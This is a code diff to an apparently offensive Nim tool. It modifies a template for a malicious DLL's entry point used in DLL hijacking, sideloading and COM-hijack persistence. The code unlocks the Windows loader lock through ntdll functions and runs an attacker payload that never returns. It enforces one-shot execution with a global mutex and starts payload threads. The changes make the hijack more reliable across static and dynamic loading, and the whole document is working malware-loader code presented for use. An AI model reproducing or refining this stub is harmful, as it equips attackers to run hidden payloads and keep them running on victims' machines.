@@ -3093,8 +3093,11 @@ let PerfectDLLHijackStub = """
 
 import perfecthijack
 
-
 proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
+  # only run once, on process attach (original ran on every THREAD_ATTACH too)
+  if fdwReason != DLL_PROCESS_ATTACH:
+    return true
+
   # we hardcode this C Code in front of NimMain, because NimMain will LoaderLock some processes that we don't want to target
   # this is especially needed/usefull for COM Hijacking persistence.
   when defined(execute_in_proc):
@@ -3130,25 +3133,33 @@ proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL 
   when not defined(payloadFunc):
     NimMain()
 
-  var ntdll: HMODULE = GetModuleHandleA("ntdll.dll")
-  var LdrUnlockLoaderLock: FARPROC = GetProcAddress(ntdll, "LdrUnlockLoaderLock")
-  var RtlExitUserProcess: FARPROC = GetProcAddress(ntdll, "RtlExitUserProcess")
-  # go for magic
-  when not defined(payloadFunc):
-    when defined(mutexoneshot):
+  if lpvReserved == nil:
+    # ---- dynamic load (LoadLibrary): rundll32, custom loader, COM hijack ----
+    # post-init context -> original trap is safe:
+    # unlock loader lock -> run/wait on main -> never return
+    # => LoadLibrary never returns => no export check, no dialog, no exit
+    var ntdll: HMODULE = GetModuleHandleA("ntdll.dll")
+    var LdrUnlockLoaderLock: FARPROC = GetProcAddress(ntdll, "LdrUnlockLoaderLock")
+    var RtlExitUserProcess: FARPROC = GetProcAddress(ntdll, "RtlExitUserProcess")
+    LdrFullUnlock(main, LdrUnlockLoaderLock, RtlExitUserProcess)
+    # never returns
+  else:
+    # ---- static load (import-table): init-time sideload, e.g. AppInstaller ----
+    # init may still be running -> CreateThread + return; worker auto-starts post-init
+    when not defined(payloadFunc):
+      when defined(mutexoneshot):
         var temp: array[MAX_PATH, char]
         if GetModuleFileNameA(cast[HMODULE](0), cast[LPSTR](temp.addr), DWORD(temp.len)) > 0:
-            let mutexName = &"Global\\REPLACEMUTEX"
-            var lastError: DWORD
-            let mutex = CreateMutexA(nil, TRUE, mutexName)
-            lastError = GetLastError()
-            if mutex != 0 and lastError != ERROR_ALREADY_EXISTS:
-              LdrFullUnlock(main, LdrUnlockLoaderLock, RtlExitUserProcess)
-    else:
-        LdrFullUnlock(main, LdrUnlockLoaderLock, RtlExitUserProcess)
-      
-  return true
+          let mutexName = &"Global\\REPLACEMUTEX"
+          let mutex = CreateMutexA(nil, TRUE, mutexName)
+          if mutex != 0 and GetLastError() != ERROR_ALREADY_EXISTS:
+            var tid: DWORD
+            discard CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](main), nil, 0, addr tid)
+      else:
+        var tid: DWORD
+        discard CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](main), nil, 0, addr tid)
 
+  return true
 """
 
 
